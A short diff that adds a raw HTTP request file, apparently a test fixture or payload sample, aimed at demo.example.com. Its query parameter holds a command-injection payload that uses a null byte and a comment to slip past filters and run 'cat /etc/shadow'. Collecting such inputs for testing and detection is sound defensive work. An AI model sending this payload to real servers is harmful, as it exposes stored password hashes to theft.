@@ -1,0 +1,4 @@
+GET /a?q=;%20/*%00*/cat%20/etc/shadow HTTP/1.1
+Host: demo.example.com
+Connection: close
+
